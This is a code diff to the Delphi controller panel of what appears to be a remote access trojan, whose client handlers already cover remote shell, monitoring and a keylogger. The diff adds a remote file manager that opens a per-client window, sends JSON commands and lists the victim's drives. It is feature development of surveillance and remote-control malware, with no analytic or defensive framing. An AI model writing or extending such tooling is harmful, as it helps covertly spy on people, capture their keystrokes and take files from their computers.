@@ -74,6 +74,7 @@ type
     procedure OnRemoteShellReceived(aLine: TncLine; JSONObj: TJSONObject);
     procedure OnMonitoringReceived(aLine: TncLine; JSONObj: TJSONObject);
     procedure OnKeyloggerReceived(aLine: TncLine; JSONObj: TJSONObject);
+    procedure OnFileManagerReceived(aLine: TncLine; JSONObj: TJSONObject);
     procedure OnServerLog(Category: TLogCategory; const Msg: string);
     procedure AddLog(Category: TLogCategory; const Msg: string);
     procedure EnsureRemoteMonitoringMenuItem;
@@ -108,6 +109,7 @@ begin
   FServerManager.OnRemoteShellReceived := OnRemoteShellReceived;
   FServerManager.OnMonitoringReceived  := OnMonitoringReceived;
   FServerManager.OnKeyloggerReceived   := OnKeyloggerReceived;
+  FServerManager.OnFileManagerReceived := OnFileManagerReceived;
   FServerManager.OnLog                 := OnServerLog;
 
   if Assigned(ProcessManager1) then
@@ -120,6 +122,8 @@ begin
   EnsureRemoteMonitoringMenuItem;
   EnsureKeyloggerMenuItem;
   EnsureOpenURLMenuItem;
+  if Assigned(FileManager1) then
+    FileManager1.OnClick := FileManager1Click;
   ListView1.OnMouseDown := ListView1MouseDown;
 end;
 
@@ -135,8 +139,47 @@ begin
 end;
 
 procedure TForm1.FileManager1Click(Sender: TObject);
+var
+  SelectedLine: TncLine;
+  LInfo       : TClientInfo;
+  F9          : TForm9;
+  ClientID    : string;
 begin
-     //File Manager PopupMenu
+  if (FServerManager = nil) or (csDestroying in ComponentState) then Exit;
+
+  if ListView1.Selected = nil then
+  begin
+    MessageBox(Handle, 'Please select a client first.', 'File Manager',
+               MB_OK or MB_ICONWARNING);
+    Exit;
+  end;
+
+  SelectedLine := TncLine(ListView1.Selected.Data);
+  if SelectedLine = nil then
+  begin
+    MessageBox(Handle, 'Selected client information not found.', 'File Manager',
+               MB_OK or MB_ICONERROR);
+    Exit;
+  end;
+
+  F9 := FServerManager.GetFileManagerForm(SelectedLine);
+
+  ClientID := 'Unknown';
+  if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
+    ClientID := LInfo.ID;
+
+  if not Assigned(F9) then
+  begin
+    F9 := TForm9.Create(Application);
+    FServerManager.RegisterFileManagerForm(SelectedLine, F9);
+  end;
+
+  F9.SetupForClient(SelectedLine, ClientID,
+                    FServerManager.SendJSON,
+                    FServerManager.UnregisterFileManagerForm);
+  F9.Show;
+  F9.BringToFront;
+  F9.RequestDrives;
 end;
 
 procedure TForm1.FormCreate(Sender: TObject);
@@ -472,6 +515,7 @@ begin
   FServerManager.UnregisterMonitoringForm(aLine);
   FServerManager.UnregisterKeyloggerForm(aLine);
   FServerManager.UnregisterOpenURLForm(aLine);
+  FServerManager.UnregisterFileManagerForm(aLine);
 end;
 
 procedure TForm1.OnInfoReceived(aLine: TncLine; JSONObj: TJSONObject);
@@ -522,6 +566,16 @@ begin
   F7 := FServerManager.GetKeyloggerForm(aLine);
   if Assigned(F7) then
     F7.HandleKeyloggerJSON(JSONObj);
+end;
+
+procedure TForm1.OnFileManagerReceived(aLine: TncLine; JSONObj: TJSONObject);
+var
+  F9: TForm9;
+begin
+  if not Assigned(FServerManager) then Exit;
+  F9 := FServerManager.GetFileManagerForm(aLine);
+  if Assigned(F9) then
+    F9.HandleFileManagerJSON(JSONObj);
 end;
 
 { --- UI Yardimci Metodlar --- }
